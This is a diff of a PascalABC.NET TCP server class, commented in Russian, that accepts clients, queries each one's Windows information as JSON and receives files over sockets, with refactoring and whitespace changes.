@@ -12,7 +12,7 @@ uses
 
 
 type
-  TcpServer = class
+  TcpServer = class 
     
     public AppIsRunning: boolean;
     public listener: TcpListener;
@@ -24,17 +24,20 @@ type
     public messageSending: boolean;
     public _accept_service, _pp_service: Thread;
     public port: integer;
+    public selectedClient: TClient;
     
     /// Представляет конструктор по умолчанию для объекта
-    public constructor();
+    public constructor(__ip: string := '');
     begin
       self.AppIsRunning := true;
-      self.ipv4 := Dns.GetHostByName(Dns.GetHostName()).AddressList.Last();
+      if __ip = '' then
+        self.ipv4 := Dns.GetHostByName(Dns.GetHostName()).AddressList.Last() else
+        self.ipv4 := IPAddress.Parse(__ip);
       self.ipv6 := Dns.GetHostAddresses(Dns.GetHostName())[0];
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
-      self.listener := new TcpListener(self.ipv4, self.port);
+      self.listener := new TcpListener(IPAddress.Any, self.port);
       self._accept_service := new Thread(AcceptService);
-      self._pp_service := new Thread(PPService);
+      {self._pp_service := new Thread(PPService);}
     end;
     
     /// Возобновляет работу сервера и всех его сервисов
@@ -156,7 +159,7 @@ type
       AppIsRunning := false;
       
       // Ждем завершения всех потоков
-      foreach var service in [self._accept_service, self._pp_service] do
+      foreach var service in [self._accept_service{, self._pp_service}] do
       begin
         if (service <> nil) and service.IsAlive then begin
           service.Join(200); // Даем 200 млсек на завершение
@@ -171,7 +174,7 @@ type
     /// Устанавливает состояние сервисов
     public procedure SetServicesState(state: ServiceState);
     begin
-      foreach var service in [self._accept_service, self._pp_service] do
+      foreach var service in [self._accept_service {, self._pp_service}] do
         if (service <> nil) then 
           case state of
             ServiceState.Run: service.Start();
@@ -181,22 +184,24 @@ type
     end;
     
     /// Сервис: Принимает заявки клиентов на подключение
-    private async procedure AcceptService();
+    private procedure AcceptService();
     begin
       while self.AppIsRunning do
       begin
         if self.listener.Pending then begin
-          var newClient: TcpClient = self.listener.AcceptTcpClient();
-          if newClient <> nil then begin
-            var ip := (newClient.Client.RemoteEndPoint as IPEndPoint).Address;
-            AddClient(new TClient(ip.ToString(), self.port, newClient));
+          var newTcpClient: TcpClient = self.listener.AcceptTcpClient();
+          if newTcpClient <> nil then begin
+            var ip := (newTcpClient.Client.RemoteEndPoint as IPEndPoint).Address;
+            var newClient := new TClient(ip.ToString(), self.port, newTcpClient);
+            newClient.WinInfo := JsonConvert.DeserializeObject&<WindowsInformation>(self.MessageHandler(GET_WIN_INFO, newClient));
+            AddClient(newClient);
           end;
         end;
       end; // while
     end;
     
     /// Сервис: Следит за состоянием подключения клиентов, реализован на технологии PING-PONG
-    private async procedure PPService();
+    private procedure PPService();
     begin
       while self.AppIsRunning do
       begin
@@ -221,15 +226,19 @@ type
         end;
         Thread.Sleep(10000);
       end; // while
-      
     end;
     
+    
     /// Отправка сообщений
-    public function MessageHandler(msg: string): string;
+    public function MessageHandler(msg: string; clnt: TClient := nil): string;
     begin
       self.messageSending := true;
       
-      var stream := self.head.client.GetStream();
+      var selectClient := clnt = nil ? self.selectedClient : clnt;
+      var stream := selectClient.client.GetStream();
+      
+      stream.ReadTimeout := 5000;
+      stream.WriteTimeout := 5000;
       
       var message: string = msg;
       var buffer: array of byte;
@@ -239,8 +248,7 @@ type
       
       stream.Write(buffer, 0, buffer.Length);
       
-      
-      SetLength(buffer, self.head.client.ReceiveBufferSize);
+      SetLength(buffer, selectClient.client.ReceiveBufferSize);
       var len := stream.Read(buffer, 0, buffer.Length); 
       
       message := Encoding.UTF8.GetString(buffer, 0, len);
@@ -260,11 +268,12 @@ type
       // Отправка команды и имени файла
       var message := E_RECEIVE_FILE + fileName;
       var buffer := Encoding.UTF8.GetBytes(message);
+      
       stream.Write(buffer, 0, buffer.Length);
       
       // Получение размера файла (8 байт)
       var sizeBuffer := new byte[8];
-      stream.Read(sizeBuffer, 0, 8);
+      stream.Read(sizeBuffer, 0, 8); 
       var fileSize := System.BitConverter.ToInt64(sizeBuffer, 0);
       
       var receivedBytes := 0;
@@ -272,6 +281,7 @@ type
       var chunk := new byte[4096];
       
       var FStream := System.IO.File.Create(savePath);
+      
       while receivedBytes < fileSize do begin
         var toRead := Min(chunk.Length, fileSize - receivedBytes);
         readBytes := stream.Read(chunk, 0, toRead);
@@ -281,6 +291,7 @@ type
         FStream.Write(chunk, 0, readBytes);
         receivedBytes += readBytes;
       end;
+      
       FStream.Close();
       
       stream.Read(chunk, 0, 3);
@@ -293,7 +304,12 @@ type
         
       self.messageSending := false;
     end;
-  
+    
+    
+    procedure SelectFirstClient();
+    begin
+      self.selectedClient := self.head;
+    end;
   
   end;// class
 
